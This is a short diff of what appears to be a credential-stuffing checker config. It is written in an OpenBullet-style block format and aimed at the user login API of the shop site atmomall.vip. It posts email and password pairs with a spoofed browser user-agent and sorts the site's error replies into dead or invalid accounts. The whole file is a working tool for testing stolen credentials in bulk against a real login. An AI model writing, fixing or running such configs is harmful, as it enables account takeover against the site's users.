@@ -1,4 +1,4 @@
-BLOCK=REQUEST-1|TYPE=POST|URL=https://atmomall.vip/api/user/login|HEADERS={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", "Pragma": "no-cache", "Accept": "*/*"}|POST=account=<EMAIL>&password=<PASSWORD>
+BLOCK=REQUEST-1|TYPE=POST|URL=https://atmomall.vip/api/user/login|HEADERS={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", "Pragma": "no-cache", "Accept": "*/*"}|CONTENT=account=<EMAIL>&password=<PASSWORD>
 BLOCK=RESULT|VAR=<REQUEST-1.text>|VALUE=Unknown parameter|CATEGORY=DEAD
 BLOCK=RESULT|VAR=<REQUEST-1.text>|VALUE=The account is incorrect|CATEGORY=DEAD
 BLOCK=RESULT|VAR=<REQUEST-1.text>|VALUE=code\":0|CATEGORY=DEAD|RETURN=Invalid Account
